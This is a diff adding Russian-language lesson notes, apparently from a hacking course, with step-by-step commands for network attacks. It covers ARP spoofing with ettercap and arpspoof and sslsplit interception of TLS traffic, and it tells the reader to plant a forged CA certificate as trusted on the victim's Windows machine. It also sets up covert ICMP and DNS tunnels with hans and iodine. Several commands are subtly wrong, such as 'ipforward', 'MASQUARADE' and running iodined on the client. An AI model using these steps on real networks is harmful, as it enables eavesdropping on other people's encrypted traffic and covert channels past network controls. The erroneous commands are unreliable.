@@ -1,0 +1,115 @@
+Extra занятие
+
+netdiscover -i <interface> -r <ip router>
+
+атака arp spoofing
+
+
+
+ettercap
+выбираем интерфейс
+запускаем нажатием галочки сверху
+добавляем таргеты
+
+
+фиксим палево с сертификатами
+
+arpspoof -i tap0 -t <victim> -r <router>
+
+https://blog.heckel.io/2013/08/04/use-sslsplit-to-transparently-sniff-tls-ssl-connections/
+https://blog.kchung.co/recording-and-decrypting-ssl-encrypted-traffic/
+
+mkdir sslsplit
+cd sslsplit
+apt update
+apt install sslsplit
+
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080  
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443  
+iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443  
+iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443  
+iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443  
+iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080
+
+mkdir /tmp/sslsplit/  
+mkdir logdir
+
+openssl genrsa -out ca.key 4096
+openssl req -new -x509 -key ca.key -out ca.crt
+
+sslsplit \  
+  -D \
+  -l connections.log \
+  -j /tmp/sslsplit/ \
+  -M ssl_key_logfile \
+  -S logdir/ \
+  -k ca.key \
+  -c ca.crt \
+   ssl 0.0.0.0 8443 \
+   tcp 0.0.0.0 8080
+   
+
+Поднимаем сервер
+cd sslstrip 
+ssl_key_logfile
+python -m SimpleHTTPServer 8888	- поднять веб сервер в текущей директирии
+
+
+на винде жертвы скачать сертификат и установить в качестве доверенного сертификата
+поместить в доверенные корневые центры сертификации
+
+теперь https не ругается
+
+
+
+Заворачиваем трафик в icmp трафик
+code.gerade.org/hans/
+mkdir hans-tunnel
+cd hans-tunnel
+apt install git net-tools make g++
+git clone https://github.com/friedrich/hans
+make
+ставим на сервер и на клиент
+
+На сервере:
+cd hans 
+./hans -s 10.1.2.0 -p <pass>
+
+На клиенте:
+./hans  -c <ip> -p <pass>
+
+
+Киляем процесс в бэкграунде
+ps -ax | grep <название процесса>
+ищем PID процесса
+kill PID
+это остановит процесс
+
+
+Делаем из linux роутер
+vim /etc/sysctl.conf
+net.ipv4.ipforward=1
+sysctl -p
+ip route add <network>/<mask> via <address>
+iptables -t nat -A POSTROUTING -s <network>/<mask> -o <interface> -j MASQUARADE 
+
+
+консольный аналог wireshark
+tcpdump -i <interface>
+
+
+Iodine туннелирование
+https://habr.com/ru/post/129097/
+
+
+apt install iodine 
+на сервере
+iodined <address>/<mask> -c <hackeru.tech> -P <pass>
+на клиенте
+iodined -P <pass> <hackeru.tech>
+
+DNS в linux 
+/etc/resolv.conf
+
+
+
